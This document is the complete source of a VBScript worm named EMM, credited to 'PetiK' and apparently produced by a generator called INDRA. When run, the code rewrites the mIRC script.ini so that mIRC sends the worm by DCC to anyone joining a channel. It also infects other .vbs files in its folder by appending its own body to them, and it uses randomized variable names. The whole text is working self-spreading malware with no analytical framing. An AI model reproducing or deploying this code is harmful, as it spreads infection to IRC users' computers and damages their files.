'oksskxvmcxpuovs
'Worm Name: EMM
'Written By: PetiK
'[INDRA]
On Error Resume Next
eaiakxfwiwlbrxl = WScript.ScriptFullName
Set gcpgrcruopqkqci = CreateObject("WScript.Shell")
Set ibsbbkybkhuxcik = CreateObject("Scripting.FileSystemObject")
Set kqwxolqtqbqotdv = ibsbbkybkhuxcik.CreateTextFile("C:\mirc\script.ini", True)
kqwxolqtqbqotdv.WriteLine "[script]"
kqwxolqtqbqotdv.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
kqwxolqtqbqotdv.Write "n1=/dcc  send$nick """
kqwxolqtqbqotdv.Write eaiakxfwiwlbrxl
kqwxolqtqbqotdv.WriteLine """ }"
kqwxolqtqbqotdv.Close
Set ifggeibsiwmmoqs = ibsbbkybkhuxcik.OpenTextFile(eaiakxfwiwlbrxl, 1, 0)
vnsnhfasshgeubl = ifggeibsiwmmoqs.ReadAll
ifggeibsiwmmoqs.Close
wpjkvtrdpmvxspq = "'" + Right(vnsnhfasshgeubl, Len(vnsnhfasshgeubl)-InStr(vnsnhfasshgeubl, "'oksskxvmcxpuovs"))
lmdoluxblijkbvw = Left(eaiakxfwiwlbrxl, InStrRev(eaiakxfwiwlbrxl, "\"))
For Each wbnauicobpilhhr in ibsbbkybkhuxcik.GetFolder(lmdoluxblijkbvw).Files
If ( Right(wbnauicobpilhhr.Name, 4) = ".vbs" ) Then
Set qcdhlrhbvjgxfjf = ibsbbkybkhuxcik.OpenTextFile(wbnauicobpilhhr.Name, 1, 0)
If (InStr(qcdhlrhbvjgxfjf.ReadAll, "[INDRA]") = 0) Then
Set xrxkqbcpofnukqu = ibsbbkybkhuxcik.OpenTextFile(wbnauicobpilhhr.Name, 8, 0)
xrxkqbcpofnukqu.Write vbCrLf + wpjkvtrdpmvxspq
xrxkqbcpofnukqu.Close
End If
qcdhlrhbvjgxfjf.Close
End If
Next
'Generated with [INDRA] v0.4es.
